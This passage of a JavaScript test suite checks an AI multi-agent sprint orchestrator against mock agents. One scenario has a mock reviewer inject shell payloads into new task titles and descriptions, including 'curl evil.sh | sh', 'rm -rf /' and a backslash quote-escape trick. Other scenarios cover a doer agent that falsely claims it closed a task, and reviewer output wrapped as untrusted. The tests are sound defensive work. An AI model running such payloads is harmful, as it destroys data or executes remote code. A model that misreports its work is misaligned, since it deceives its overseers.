                target_issue: epicBead.id,
                members: ['local'],
                branch: 'auto-sprint/mock-sprint-rejected',
                base_branch: 'main',
                goal: 'P1/P2',
                max_cycles: 5,
            }, true);
        } catch (err) {
            error = err;
        }

        return { dispatched, error };
    } finally {
        await teardown(tempDir);
    }
}

/**
 * Shared harness for the apra-fleet-unw.16 develop/review-loop scenarios:
 * minimal setup (no deploy.md/integ-test-playbook.md, no plan-phase
 * re-planning churn -- plan approves immediately), a `logs` array capturing
 * every `FleetWorkflow` 'log' event (so scenarios can assert on the
 * orchestrator's own reasoning, e.g. "treating streak as FAILED", without
 * having to reverse-engineer internal round-counting), and pass-through
 * doer/reviewer handler overrides.
 */
async function runDevelopLoopScenario(tag, {
    members, taskSpecs, doerHandler, reviewerHandler,
    // apra-fleet-unw.17 additions:
    deployHandler, integHandler, finalReviewHandler, commandFailurePattern,
    goal = 'P1/P2', maxCycles = 1,
    // Optional hook invoked with {tempDir, runCmd, epicBead, tasks} AFTER
    // setupMinimal() creates the epic/tasks but BEFORE the sprint runs --
    // used by scenarios that need extra beads/dependency wiring not covered
    // by plain taskSpecs (e.g. a permanently-blocked bead for the A5
    // goal-priority exit-condition scenarios below).
    beforeSprint,
    // deploy.md / integ-test-playbook.md are NOT written by setupMinimal();
    // set true to write them (enabling the Deploy/Integ phases).
    withRunbooks = false,
    // apra-fleet-unw2.9 (N11) additions: see buildMockFleetApi's option
    // comments above. `branchOverride` lets a scenario force a specific
    // branch name (rather than the tag-derived default) -- used by the
    // idempotent-PR-creation regression test, which must dispatch TWO
    // separate scenario runs against the exact SAME branch to simulate a
    // re-run of finalization.
    gitGhFailurePattern, gitGhFailureMessage, prExistsState, branchOverride,
}) {
    const { tempDir, epicBead, tasks } = await setupMinimal(tag, taskSpecs);
    if (withRunbooks) {
        await fs.writeFile(path.join(tempDir, 'deploy.md'), '# Deploy\nrun `npm publish`');
        await fs.writeFile(path.join(tempDir, 'integ-test-playbook.md'), '# Integ Test\nRun `vitest e2e`');
    }
    if (beforeSprint) {
        await beforeSprint({ tempDir, runCmd, epicBead, tasks });
    }
    const dispatched = [];
    const commandLog = [];
    const commandLogDetailed = [];
    const memberGitState = new Map();
    const logs = [];
    try {
        const mockFleetApi = buildMockFleetApi(tempDir, epicBead, dispatched, commandLog, {
            planReviewerMode: 'approve-immediately',
            addExtraTaskDuringPlan: false,
            doerHandler,
            reviewerHandler,
            deployHandler,
            integHandler,
            finalReviewHandler,
            commandFailurePattern,
            commandLogDetailed,
            memberGitState,
            gitGhFailurePattern,
            gitGhFailureMessage,
            prExistsState,
        });
        const workflow = new FleetWorkflow(mockFleetApi, { targetRepo: tempDir });
        workflow.on('log', (e) => logs.push(e.msg));
        const engine = new WorkflowEngine(workflow);
        const scriptPath = path.join(__dirname, '../auto-sprint/runner.js');

        const branch = branchOverride || `auto-sprint/mock-${tag}`;
        let error = null;
        let result = null;
        try {
            result = await engine.executeFile(scriptPath, {
                target_issue: epicBead.id,
                members,
                branch,
                base_branch: 'main',
                goal,
                max_cycles: maxCycles,
            }, true);
        } catch (err) {
            error = err;
        }

        const finalBeadsRaw = JSON.parse((await runCmd('bd list --all --json', tempDir)).stdout || '[]');
        const finalBeadsById = new Map(finalBeadsRaw.map((b) => [b.id, b]));

        return { dispatched, commandLog, commandLogDetailed, memberGitState, logs, error, result, tasks, epicBeadId: epicBead.id, finalBeadsById, branch };
    } finally {
        await teardown(tempDir);
    }
}

const REQUIRED_AGENT_TYPES = ['planner', 'plan-reviewer', 'doer', 'reviewer', 'deployer', 'integ-test-runner', 'harvester'];

async function main() {
    const failures = [];
    const check = (cond, msg) => { if (!cond) failures.push(msg); };

    console.log('Running mock sprint scenario (pass 1)...');
    const run1 = await runOnce('run1');
    console.log('Running mock sprint scenario (pass 2)...');
    const run2 = await runOnce('run2');

    check(run1.result && run1.result.status === 'success', `Run1 did not succeed: ${JSON.stringify(run1.result)}`);
    check(run2.result && run2.result.status === 'success', `Run2 did not succeed: ${JSON.stringify(run2.result)}`);

    // apra-fleet-unw.14: branch/base_branch/goal/max_cycles values passed
    // into executeFile() must actually reach and be exposed by the runner,
    // not just be parsed and dropped.
    check(run1.result && run1.result.branch === 'auto-sprint/mock-sprint', `Run1 result did not expose branch: ${JSON.stringify(run1.result)}`);
    check(run1.result && run1.result.baseBranch === 'main', `Run1 result did not expose baseBranch: ${JSON.stringify(run1.result)}`);
    check(run1.result && run1.result.goal === 'P1/P2', `Run1 result did not expose goal: ${JSON.stringify(run1.result)}`);
    check(run1.result && run1.result.maxCycles === 5, `Run1 result did not expose maxCycles: ${JSON.stringify(run1.result)}`);

    // apra-fleet-unw.14: git semantics -- ensure/create the sprint branch is
    // the very first command dispatched (before any bd/node command), and
    // push + PR-raise are the last two commands dispatched (finalization).
    check(
        run1.commandLog.length >= 3 && /^git fetch /.test(run1.commandLog[0]) && run1.commandLog[0].includes('git checkout -B auto-sprint/mock-sprint'),
        `Expected first commandLog entry to be the sprint-branch-ensure git command, got: ${JSON.stringify(run1.commandLog[0])}`
    );
    const pushIdx = run1.commandLog.length - 2;
    const prIdx = run1.commandLog.length - 1;
    check(
        run1.commandLog[pushIdx] && run1.commandLog[pushIdx].startsWith('git push -u origin auto-sprint/mock-sprint'),
        `Expected second-to-last commandLog entry to be the branch push, got: ${JSON.stringify(run1.commandLog[pushIdx])}`
    );
    check(
        run1.commandLog[prIdx] && run1.commandLog[prIdx].startsWith('gh pr create') && run1.commandLog[prIdx].includes('--base "main"') && run1.commandLog[prIdx].includes('--head "auto-sprint/mock-sprint"'),
        `Expected last commandLog entry to be the PR-raise (not merge) command, got: ${JSON.stringify(run1.commandLog[prIdx])}`
    );
    check(
        !run1.commandLog.some((c) => /^git\s+merge|gh\s+pr\s+merge/.test(c)),
        `Runner must never auto-merge (pm skill R12); found a merge command in the log: ${JSON.stringify(run1.commandLog)}`
    );

    const seq1 = run1.dispatched.map((d) => `${d.agent}${d.label ? ':' + d.label : ''}`);
    const seq2 = run2.dispatched.map((d) => `${d.agent}${d.label ? ':' + d.label : ''}`);
    check(
        JSON.stringify(seq1) === JSON.stringify(seq2),
        `Dispatched agent sequences differ between runs (non-deterministic).\nRun1: ${seq1.join(', ')}\nRun2: ${seq2.join(', ')}`
    );

    for (const type of REQUIRED_AGENT_TYPES) {
        check(run1.dispatched.some((d) => d.agent === type), `Phase for agentType '${type}' was never dispatched (run1)`);
        check(run2.dispatched.some((d) => d.agent === type), `Phase for agentType '${type}' was never dispatched (run2)`);
    }
    check(
        run1.dispatched.some((d) => d.agent === 'reviewer' && d.label === 'Final Review'),
        "Final Review phase (agentType 'reviewer', label 'Final Review') was not dispatched (run1)"
    );

    // apra-fleet-unw2.10 (N12): a normal sprint run must genuinely harvest
    // OK -- not merely dispatch the harvester phase. The mock harvester
    // returns FAILED if any of the five vendored-required inputs is missing
    // from the prompt it actually received (see buildMockFleetApi's
    // 'harvester' branch above), so re-running that exact check against the
    // real dispatched prompt here is proof the runner supplies all five for
    // real -- not that the mock's contract check was loosened to pass.
    for (const [label, run] of [['run1', run1], ['run2', run2]]) {
        const harvesterDispatch = run.dispatched.find((d) => d.agent === 'harvester');
        check(harvesterDispatch !== undefined, `No harvester dispatch found (${label})`);
        if (harvesterDispatch) {
            const p = harvesterDispatch.prompt;
            const missing = checkHarvesterContract(p);
            check(missing.length === 0, `Harvester prompt missing/blank required input(s): ${missing.join(', ')} (${label})`);
        }
    }

    check(
        JSON.stringify(run1.finalBeads) === JSON.stringify(run2.finalBeads),
        `Final beads DB state differs between runs.\nRun1: ${JSON.stringify(run1.finalBeads)}\nRun2: ${JSON.stringify(run2.finalBeads)}`
    );

    const expectedClosedTitles = [
        'Task: Implement registerMember in client.js',
        'Task: Implement listMembers in client.js',
        'Task: Add tests for API endpoints'
    ];
    for (const title of expectedClosedTitles) {
        const bead = run1.finalBeads.find((b) => b.title === title);
        check(!!bead && bead.status === 'closed', `Expected bead '${title}' to be closed at end of sprint, got: ${JSON.stringify(bead)}`);
    }
    check(!run1.finalBeads.some((b) => b.title.startsWith('Bug:')), 'Unexpected bug bead created despite deterministic passing integ test');
    check(
        run1.finalBeads.filter((b) => b.title === 'Task: Add tests for API endpoints').length === 1,
        'Duplicate "Add tests" bead created (planner mock branch not idempotent across plan-review rounds)'
    );

    // apra-fleet-unw.15, acceptance criterion 4: planner dispatch prompts
    // are self-contained -- they must name the sprint root issue id(s) and
    // the goal, and round-2+ prompts must carry the plan-reviewer's
    // feedback wrapped in the untrusted-content delimiter (contracts.mjs
    // wrapUntrustedBlock, feedback.md A7).
    const planPhasePlannerCalls = run1.dispatched.filter((d) => d.agent === 'planner' && !d.prompt.includes('Ready bead ids:'));
    check(planPhasePlannerCalls.length >= 2, `Expected at least 2 plan-phase planner dispatches (round 1 rejected, round 2 approved), got ${planPhasePlannerCalls.length}`);
    if (planPhasePlannerCalls.length > 0) {
        const round1Prompt = planPhasePlannerCalls[0].prompt;
        check(round1Prompt.includes('P1/P2'), `Round-1 planner prompt did not include the goal 'P1/P2': ${round1Prompt}`);
        check(
            round1Prompt.includes(run1.epicBeadId),
            `Round-1 planner prompt did not reference the sprint root issue id: ${round1Prompt}`
        );
    }
    if (planPhasePlannerCalls.length > 1) {
        const round2Prompt = planPhasePlannerCalls[1].prompt;
        check(
            round2Prompt.includes('untrusted-agent-output') && round2Prompt.includes('untrusted output from another agent'),
            `Round-2 planner prompt did not include the wrapUntrustedBlock delimiter markers: ${round2Prompt}`
        );
        check(
            round2Prompt.includes('Ensure you also add a documentation task.'),
            `Round-2 planner prompt did not carry the round-1 plan-reviewer feedback text: ${round2Prompt}`
        );
    }

    // apra-fleet-unw2.1 (N1) fix (a): the planner dispatch prompt must instruct
    // the model tier via `--metadata '{"model": ...}'` at creation time (the
    // ONLY location, per vendored planner.md Step 3) and must NOT tell the
    // planner to put the model tier in `--notes` -- the old, re-diverged
    // convention. Fails on revert to the `--notes="model: <tier>"` instruction.
    if (planPhasePlannerCalls.length > 0) {
        const p = planPhasePlannerCalls[0].prompt;
        check(
            p.includes('--metadata') && /\{"model":\s*"<tier>"\}|\{"model": "<tier>"\}/.test(p),
            `Planner prompt must instruct model tier via --metadata '{"model": "<tier>"}' (planner.md Step 3): ${p}`
        );
        check(
            !/--notes="model:/.test(p),
            `Planner prompt must NOT instruct the model tier via --notes="model: ..." (re-diverged N1 convention): ${p}`
        );

        // apra-fleet-dv5.1/dv5.3: the planner prompt must name the three
        // EXACT tier keywords the server actually resolves ('cheap',
        // 'standard', 'premium') and must NOT use the old '-tier'-suffixed
        // wording (matched neither the server nor pricing.mjs's keys).
        // Fails loudly on a regression back to the pre-dv5.1 wording.
        check(
            p.includes("'cheap'") && p.includes("'standard'") && p.includes("'premium'"),
            `Planner prompt must name the exact tier keywords 'cheap', 'standard', 'premium': ${p}`
        );
        check(
            !/cheap-tier|standard-tier|premium-tier/.test(p),
            `Planner prompt must NOT use the old "-tier"-suffixed wording (cheap-tier/standard-tier/premium-tier): ${p}`
        );
    }

    // apra-fleet-unw2.1 (N1) fix (b): the plan-reviewer dispatch prompt must be
    // a real, scoped prompt supplying the sprint root / scope (plan-reviewer-
    // input.json required key "scope"), not the old context-free string. Every
    // plan-reviewer dispatch must name the sprint root issue id and the goal.
    const planReviewerDispatches = run1.dispatched.filter((d) => d.agent === 'plan-reviewer');
    check(planReviewerDispatches.length >= 1, 'Expected at least one plan-reviewer dispatch in run1');
    for (const d of planReviewerDispatches) {
        check(
            /scope/i.test(d.prompt) && d.prompt.includes(run1.epicBeadId),
            `Plan-reviewer dispatch prompt must supply the sprint root / scope (issue id ${run1.epicBeadId}): ${d.prompt}`
        );
        check(
            d.prompt.includes('P1/P2'),
            `Plan-reviewer dispatch prompt must name the goal priority: ${d.prompt}`
        );
        check(
            d.prompt !== 'Review the plan per your agent contract.',
            'Plan-reviewer dispatch prompt must not be the old context-free string (N1 regression)'
        );
    }

    // apra-fleet-unw2.1 (N1) fix (c): the doer dispatch prompt must supply the
    // sprint track `branch` (doer-input.json required key "branch"). Every doer
    // dispatch must name the branch this sprint runs on. Fails on revert.
    const doerDispatches = run1.dispatched.filter((d) => d.agent === 'doer');
    check(doerDispatches.length >= 1, 'Expected at least one doer dispatch in run1');
    for (const d of doerDispatches) {
        check(
            /Sprint track branch to work on:\s*auto-sprint\/mock-sprint/.test(d.prompt),
            `Doer dispatch prompt must supply the sprint track branch (doer-input.json required "branch"): ${d.prompt}`
        );
    }

    // apra-fleet-unw.15, acceptance criteria 1-3: a plan-reviewer that
    // never returns an APPROVED schema-valid verdict (here: persistent
    // non-JSON free text containing "APPROVED" inside a rejection sentence)
    // must abort the sprint with SprintPlanRejectedError after 3 rounds,
    // and must NEVER dispatch a doer.
    console.log('Running mock sprint scenario (rejected plan, 3x CHANGES_NEEDED)...');
    const rejected = await runRejectedPlanScenario('rejected');
    check(!!rejected.error, 'Expected engine.executeFile() to reject when the plan is never approved, but it resolved successfully');
    check(
        rejected.error instanceof SprintPlanRejectedError,
        `Expected a SprintPlanRejectedError, got: ${rejected.error ? rejected.error.constructor.name + ': ' + rejected.error.message : 'no error'}`
    );
    check(
        !rejected.dispatched.some((d) => d.agent === 'doer'),
        `Expected zero doer dispatches when the plan is never approved, got: ${JSON.stringify(rejected.dispatched.map((d) => d.agent))}`
    );
    const rejectedPlannerCalls = rejected.dispatched.filter((d) => d.agent === 'planner' && !d.prompt.includes('Ready bead ids:'));
    check(rejectedPlannerCalls.length === 3, `Expected exactly 3 plan-phase planner dispatches (3 rejected rounds), got ${rejectedPlannerCalls.length}`);

    // =========================================================================
    // apra-fleet-unw.16 acceptance criterion 1: multi-member doer pool
    // =========================================================================
    // Root-cause regression test for the A2 "Doer/doer casing" pool-collapse
    // bug: getMembersForRole used to special-case the CAPITALIZED
    // 'Doer'/'Reviewer' strings while every call site passed lowercase
    // 'doer'/'reviewer', so the pool silently collapsed to physicalMembers[0]
    // no matter how many members were configured. With 2 distinct members
    // configured and 2 ready (independent) tasks, BOTH members must receive
    // a doer dispatch in round 1.
    console.log('Running mock sprint scenario (multi-member doer pool)...');
    const multiDoer = await runDevelopLoopScenario('multidoer', {
        members: ['m1', 'm2'],
        taskSpecs: [
            { title: 'Task: Implement registerMember in client.js' },
            { title: 'Task: Implement listMembers in client.js' },
        ],
        // Always-approve reviewer: keeps this scenario to a single dev
        // round so the streak-assignment-dispatch-count assertion below
        // (exactly 1) isn't coupled to the default reviewer mock's
        // scripted one-time reopen behavior.
        reviewerHandler: async () => ({
            content: [{ text: JSON.stringify({ verdict: 'APPROVED', notes: 'Both look good.', reopenIds: [], newTasks: [] }) }]
        }),
    });
    check(!multiDoer.error, `Multi-doer scenario did not complete: ${multiDoer.error ? multiDoer.error.message : ''}`);
    const multiDoerFirstRoundDoerCalls = multiDoer.dispatched.filter((d) => d.agent === 'doer');
    const multiDoerMembers = new Set(multiDoerFirstRoundDoerCalls.map((d) => d.member));
    check(multiDoerMembers.has('m1'), `Expected member 'm1' to receive a doer dispatch, got members: ${JSON.stringify([...multiDoerMembers])}`);
    check(multiDoerMembers.has('m2'), `Expected member 'm2' to receive a doer dispatch, got members: ${JSON.stringify([...multiDoerMembers])}`);
    check(multiDoerFirstRoundDoerCalls.length >= 2, `Expected at least 2 doer dispatches (one per ready task), got ${multiDoerFirstRoundDoerCalls.length}`);
    for (const t of multiDoer.tasks) {
        const bead = multiDoer.finalBeadsById.get(t.id);
        check(!!bead && bead.status === 'closed', `Multi-doer scenario: expected bead '${t.id}' (${t.title}) to be closed, got: ${JSON.stringify(bead)}`);
    }

    // =========================================================================
    // apra-fleet-unw2.4 (N4): branch-ensure must be dispatched to EVERY member
    // in the union of the orchestrator/doer/reviewer pools, not just the
    // orchestrator member. With 2 distinct members configured, the sprint-
    // branch ensure (`git checkout -B <branch> origin/<base>`) must land on
    // BOTH members' checkouts before the first doer round.
    //
    // This is the regression tripwire for N4: against the PRE-FIX runner
    // (which dispatched the ensure to `orchestratorMember` only) the second
    // member's checkout is never ensured, so both the per-member command-log
    // assertion and the per-member git-state assertion below FAIL; against the
    // fixed runner (ensure over the union of the pools) both PASS.
    // =========================================================================
    console.log('Running mock sprint scenario (2-member branch-ensure everywhere)...');
    const twoMemberEnsure = await runDevelopLoopScenario('twomemberensure', {
        members: ['m1', 'm2'],
        taskSpecs: [
            { title: 'Task: Two-member ensure A' },
            { title: 'Task: Two-member ensure B' },
        ],
        // Approve immediately so the scenario stays a single dev round -- the
        // property under test is the branch-ensure dispatch topology, not the
        // develop/review loop.
        reviewerHandler: async () => ({
            content: [{ text: JSON.stringify({ verdict: 'APPROVED', notes: 'Both look good.', reopenIds: [], newTasks: [] }) }]
        }),
    });
    check(!twoMemberEnsure.error, `2-member ensure scenario should complete: ${twoMemberEnsure.error ? twoMemberEnsure.error.message : ''}`);
    const ensureBranch = 'auto-sprint/mock-twomemberensure';
    const ensureLog = twoMemberEnsure.commandLogDetailed.filter((e) => e.command.includes(`git checkout -B ${ensureBranch}`));
    const ensuredMembers = new Set(ensureLog.map((e) => e.member));
    check(
        ensuredMembers.has('m1'),
        `Expected the sprint-branch ensure to be dispatched to member 'm1', ensure log: ${JSON.stringify(ensureLog)}`
    );
    check(
        ensuredMembers.has('m2'),
        `Expected the sprint-branch ensure to be dispatched to member 'm2' too (N4: ensure-everywhere, not orchestrator-only), ensure log: ${JSON.stringify(ensureLog)}`
    );
    // The modeled per-member git state must agree: BOTH members' checkouts had
    // the sprint branch ensured (this is the state the pre-fix runner failed
    // to establish on the non-orchestrator member).
    const m1Git = twoMemberEnsure.memberGitState.get('m1');
    const m2Git = twoMemberEnsure.memberGitState.get('m2');
    check(
        m1Git && m1Git.ensuredBranches.has(ensureBranch),
        `Expected member 'm1' git state to have the sprint branch ensured, got: ${JSON.stringify(m1Git ? [...m1Git.ensuredBranches] : null)}`
    );
    check(
        m2Git && m2Git.ensuredBranches.has(ensureBranch),
        `Expected member 'm2' git state to have the sprint branch ensured, got: ${JSON.stringify(m2Git ? [...m2Git.ensuredBranches] : null)}`
    );
    // Both configured members' beads all close (the sprint runs to success)
    // -- proving ensure-everywhere doesn't regress the happy path.
    for (const t of twoMemberEnsure.tasks) {
        const bead = twoMemberEnsure.finalBeadsById.get(t.id);
        check(!!bead && bead.status === 'closed', `2-member ensure scenario: expected bead '${t.id}' (${t.title}) to be closed, got: ${JSON.stringify(bead)}`);
    }

    // =========================================================================
    // apra-fleet-unw.16 acceptance criterion 2: doer failure isolation + retry
    // =========================================================================
    // One task's doer ALWAYS throws (both the original dispatch and the
    // one retry); a sibling, independent task's doer succeeds normally.
    // Expect: (a) engine.executeFile() still resolves (parallel()'s
    // continueOnError:true isolates the failing streak instead of aborting
    // the whole cycle), (b) the sibling bead closes normally, (c) the
    // failing bead's doer was dispatched exactly twice (original + one
    // retry, no more), (d) the failing bead never closes.
    console.log('Running mock sprint scenario (doer streak throws, sibling completes)...');
    const isolation = await runDevelopLoopScenario('isolation', {
        members: ['local'],
        taskSpecs: [
            { title: 'Task: Always throws' },
            { title: 'Task: Always succeeds' },
        ],
        doerHandler: async ({ opts, tempDir: td, epicBead: epic }) => {
            const match = opts.prompt.match(/Assigned bead ids \(comma-separated\):\s*(.+)/);
            const ids = match ? match[1].split(',').map((s) => s.trim()).filter(Boolean) : [];
            const listRes = JSON.parse((await runCmd('bd list --json', td)).stdout || '[]');
            const throwsTask = listRes.find((b) => b.title === 'Task: Always throws');
            if (throwsTask && ids.includes(throwsTask.id)) {
                throw new Error(`mock doer failure for bead ${throwsTask.id}`);
            }
            for (const id of ids) {
                await runCmd(`bd close ${id}`, td);
            }
            return { content: [{ text: JSON.stringify({ status: 'VERIFY', closedIds: ids, notes: 'Closed successfully.' }) }] };
        },
        reviewerHandler: async () => ({
            content: [{ text: JSON.stringify({ verdict: 'APPROVED', notes: 'Approved whatever closed.', reopenIds: [], newTasks: [] }) }]
        }),
    });
    check(!isolation.error, `Doer-failure-isolation scenario should not abort the whole sprint: ${isolation.error ? isolation.error.message : ''}`);
    // apra-fleet-unw.17 (A5/A6): the always-throwing bead never closes, so
    // it remains an open goal-priority bead at Finalization -- the
    // evidence-based final verdict now correctly reports FAIL (status:
    // 'failed') for this scenario instead of the old blanket 'success'.
    // The important property under test here is isolation (the sprint
    // resolves at all, rather than rejecting/throwing), not that an
    // unclosed bead is rubber-stamped as a pass.
    check(isolation.result && isolation.result.status === 'failed', `Doer-failure-isolation scenario should resolve with a FAIL verdict (one bead never closed): ${JSON.stringify(isolation.result)}`);
    const throwsTaskId = isolation.tasks.find((t) => t.title === 'Task: Always throws').id;
    const succeedsTaskId = isolation.tasks.find((t) => t.title === 'Task: Always succeeds').id;
    // The always-throwing bead is never closed, so it stays `ready` and is
    // re-picked up every subsequent dev round (the loop's own 3-round cap,
    // untouched by apra-fleet-unw.16 -- out of scope, see unw.17): 1
    // original + 1 retry per round, for 3 rounds = 6 total dispatches. The
    // key property under test isn't the absolute count but that it's an
    // exact multiple of 2 (every dispatch was retried exactly once, never
    // more, never left un-retried) and that the sibling only ever needed
    // one attempt.
    const throwsDispatchCount = isolation.dispatched.filter((d) => d.agent === 'doer' && d.prompt.includes(throwsTaskId)).length;
    check(throwsDispatchCount === 6, `Expected the always-throwing streak to be dispatched exactly 6 times (1 original + 1 retry, across 3 dev rounds), got ${throwsDispatchCount}`);
    const succeedsDispatchCount = isolation.dispatched.filter((d) => d.agent === 'doer' && d.prompt.includes(succeedsTaskId)).length;
    check(succeedsDispatchCount === 1, `Expected the sibling streak to be dispatched exactly once (no throw, no retry needed), got ${succeedsDispatchCount}`);
    check(
        isolation.finalBeadsById.get(succeedsTaskId) && isolation.finalBeadsById.get(succeedsTaskId).status === 'closed',
        `Expected sibling bead '${succeedsTaskId}' to be closed despite the sibling streak throwing, got: ${JSON.stringify(isolation.finalBeadsById.get(succeedsTaskId))}`
    );
    check(
        isolation.finalBeadsById.get(throwsTaskId) && isolation.finalBeadsById.get(throwsTaskId).status !== 'closed',
        `Expected the always-throwing bead '${throwsTaskId}' to remain open (never closed), got: ${JSON.stringify(isolation.finalBeadsById.get(throwsTaskId))}`
    );
    check(
        isolation.logs.some((m) => m.includes('Retrying once')),
        `Expected a "Retrying once" log line for the failed streak, logs: ${JSON.stringify(isolation.logs)}`
    );

    // =========================================================================
    // apra-fleet-unw.16 acceptance criterion 3: reviewer JSON reopenIds ->
    // ORCHESTRATOR (not the LLM) applies bd update --status=open
    // =========================================================================
    console.log('Running mock sprint scenario (reviewer reopenIds -> orchestrator applies)...');
    const reopen = await runDevelopLoopScenario('reopen', {
        members: ['local'],
        taskSpecs: [
            { title: 'Task: Reopen target A' },
            { title: 'Task: Reopen target B' },
        ],
        reviewerHandler: async ({ reviewRound: rRound, tempDir: td }) => {
            if (rRound === 1) {
                const listRes = JSON.parse((await runCmd('bd list --all --json', td)).stdout || '[]');
                const targetA = listRes.find((b) => b.title === 'Task: Reopen target A');
                return {
                    content: [{
                        text: JSON.stringify({
                            verdict: 'CHANGES_NEEDED',
                            notes: 'Target A needs a fix.',
                            reopenIds: [targetA.id],
                            newTasks: [],
                        })
                    }]
                };
            }
            return { content: [{ text: JSON.stringify({ verdict: 'APPROVED', notes: 'All good now.', reopenIds: [], newTasks: [] }) }] };
        },
    });
    check(!reopen.error, `Reopen scenario should not error: ${reopen.error ? reopen.error.message : ''}`);
    const targetAId = reopen.tasks.find((t) => t.title === 'Task: Reopen target A').id;
    const targetBId = reopen.tasks.find((t) => t.title === 'Task: Reopen target B').id;
    check(
        reopen.commandLog.some((c) => c === `bd update ${targetAId} --status=open`),
        `Expected the RUNNER (orchestrator) to issue 'bd update ${targetAId} --status=open', commandLog: ${JSON.stringify(reopen.commandLog)}`
    );
    check(
        !reopen.commandLog.some((c) => c === `bd update ${targetBId} --status=open`),
        `Did NOT expect a reopen command for bead '${targetBId}' (not in reopenIds), commandLog: ${JSON.stringify(reopen.commandLog)}`
    );
    // Confirm the reviewer's own mock handler is a pure JSON-return -- it
    // never calls runCmd('bd update ...'/'bd close ...'), i.e. only the
    // orchestrator's own code (buildMockFleetApi's executeCommand path,
    // invoked FROM runner.js's command() calls) ever issues the reopen.
    // Grep the actual reviewer DISPATCH PROMPT text (not just the mock's
    // behavior) to confirm runner.js's prompt itself forbids bd mutation --
    // this is the "redundant, dispatch-prompt-level" contract required by
    // apra-fleet-unw.16 Work item 4.
    const reviewerDispatchPrompts = reopen.dispatched.filter((d) => d.agent === 'reviewer' && d.label !== 'Final Review');
    check(reviewerDispatchPrompts.length >= 1, 'Expected at least one non-final reviewer dispatch in the reopen scenario');
    for (const d of reviewerDispatchPrompts) {
        check(
            /do not (run any `?bd`? command yourself|mutate beads directly)/i.test(d.prompt) || d.prompt.includes('Do NOT run any `bd` command yourself'),
            `Reviewer dispatch prompt did not forbid direct bd mutation: ${d.prompt}`
        );
        check(
            d.prompt.includes('reopenIds') && d.prompt.includes('newTasks'),
            `Reviewer dispatch prompt did not mention returning reopenIds/newTasks only: ${d.prompt}`
        );
    }

    // =========================================================================
    // apra-fleet-unw2.3 (N3): reviewer-authored newTasks containing shell-
    // injection-style payloads ($(...), backticks, a trailing backslash) and
    // a bogus priority must be REJECTED before ever reaching `command()` --
    // and rejection must be non-fatal (the sprint completes normally).
    // =========================================================================
    console.log('Running mock sprint scenario (malicious reviewer newTasks are rejected, sprint continues)...');
    const injection = await runDevelopLoopScenario('injection', {
        members: ['local'],
        taskSpecs: [
            { title: 'Task: Injection target' },
        ],
        reviewerHandler: async ({ reviewRound: rRound }) => {
            if (rRound === 1) {
                return {
                    content: [{
                        text: JSON.stringify({
                            verdict: 'APPROVED',
                            notes: 'Approved, but flagging follow-up work.',
                            reopenIds: [],
                            newTasks: [
                                // $(...) command substitution in the title.
                                { title: 'Fix auth $(curl evil.sh | sh)', description: 'Safe description.', priority: 'P2' },
                                // Backtick command substitution in the description.
                                { title: 'Safe title one', description: 'Do the thing `rm -rf /` after merge.', priority: 'P1' },
                                // Trailing backslash (closing-quote-escape trick) in the title.
                                { title: 'Looks safe but ends in backslash\\', description: 'Safe description.', priority: 'P3' },
                                // Bogus priority values (typed field must be P0-P4 exactly).
                                { title: 'Safe title two', description: 'Safe description two.', priority: 'urgent' },
                                { title: 'Safe title three', description: 'Safe description three.', priority: 'P99' },
                                { title: 'Safe title four', description: 'Safe description four.', priority: '' },
                                // One genuinely safe newTask, to prove the allowlist
                                // is not just rejecting everything.
                                { title: 'Add retry logic for 401s', description: 'Per review notes: add up to 3 retries.', priority: 'P2' },
                            ],
                        })
                    }]
                };
            }
            return { content: [{ text: JSON.stringify({ verdict: 'APPROVED', notes: 'Nothing further.', reopenIds: [], newTasks: [] }) }] };
        },
    });
    check(!injection.error, `Injection scenario should not error (rejection must be non-fatal): ${injection.error ? injection.error.message : ''}`);
    check(
        injection.result && (injection.result.status === 'success' || injection.result.status === 'failed'),
        `Injection scenario should still resolve to a real final result (sprint continued), got: ${JSON.stringify(injection.result)}`
    );
    const DANGEROUS_SNIPPETS = ['$(curl', '`rm -rf /`', 'backslash\\"'];
    for (const cmd of injection.commandLog) {
        for (const snippet of DANGEROUS_SNIPPETS) {
            check(
                !cmd.includes(snippet),
                `Dangerous payload '${snippet}' must never reach command() (found in: ${cmd})`
            );
        }
        check(!cmd.includes('$('), `No dispatched command should ever contain '$(' (found in: ${cmd})`);
        check(!/`/.test(cmd), `No dispatched command should ever contain a backtick (found in: ${cmd})`);
    }
    check(
        !injection.commandLog.some((c) => c.startsWith('bd create') && c.includes('-p "urgent"')),
        `A bogus priority 'urgent' must never reach a dispatched bd create command, commandLog: ${JSON.stringify(injection.commandLog)}`
    );
    check(
        !injection.commandLog.some((c) => c.startsWith('bd create') && c.includes('-p "P99"')),
        `A bogus priority 'P99' must never reach a dispatched bd create command, commandLog: ${JSON.stringify(injection.commandLog)}`
    );
    check(
        injection.commandLog.some((c) => c.startsWith('bd create') && c.includes('Add retry logic for 401s')),
        `Expected the one genuinely safe newTask to still be created via bd create, commandLog: ${JSON.stringify(injection.commandLog)}`
    );
    check(
        injection.logs.filter((m) => m.includes('REJECTED (not sent to bd create)')).length >= 6,
        `Expected at least 6 "REJECTED (not sent to bd create)" log lines (one per unsafe newTask), logs: ${JSON.stringify(injection.logs)}`
    );

    // =========================================================================
    // apra-fleet-unw.16 acceptance criterion 4: doer "lies" (success text,
    // bead never actually closed) is treated as a FAILURE, not a success
    // =========================================================================
    console.log('Running mock sprint scenario (doer lies about closing a bead)...');
    const liar = await runDevelopLoopScenario('liar', {
        members: ['local'],
        taskSpecs: [
            { title: 'Task: Lied about closing' },
        ],
        doerHandler: async ({ opts }) => {
            const match = opts.prompt.match(/Assigned bead ids \(comma-separated\):\s*(.+)/);
            const ids = match ? match[1].split(',').map((s) => s.trim()).filter(Boolean) : [];
            // Deliberately do NOT call `bd close` -- report success anyway.
            return {
                content: [{
                    text: JSON.stringify({ status: 'VERIFY', closedIds: ids, notes: 'All done, closed successfully!' })
                }]
            };
        },
    });
    check(!liar.error, `Doer-lies scenario should not error: ${liar.error ? liar.error.message : ''}`);
    const liedTaskId = liar.tasks.find((t) => t.title === 'Task: Lied about closing').id;
    check(
        liar.finalBeadsById.get(liedTaskId) && liar.finalBeadsById.get(liedTaskId).status !== 'closed',
        `Expected the bead the doer lied about to remain open, got: ${JSON.stringify(liar.finalBeadsById.get(liedTaskId))}`
    );
    check(
        liar.logs.some((m) => m.includes('treating streak as FAILED') && m.includes(liedTaskId)),
        `Expected a "treating streak as FAILED" log line naming '${liedTaskId}' despite the doer's success-looking report, logs: ${JSON.stringify(liar.logs)}`
    );

    // =========================================================================
    // apra-fleet-unw.16 acceptance criterion 5: no discarded agent() results
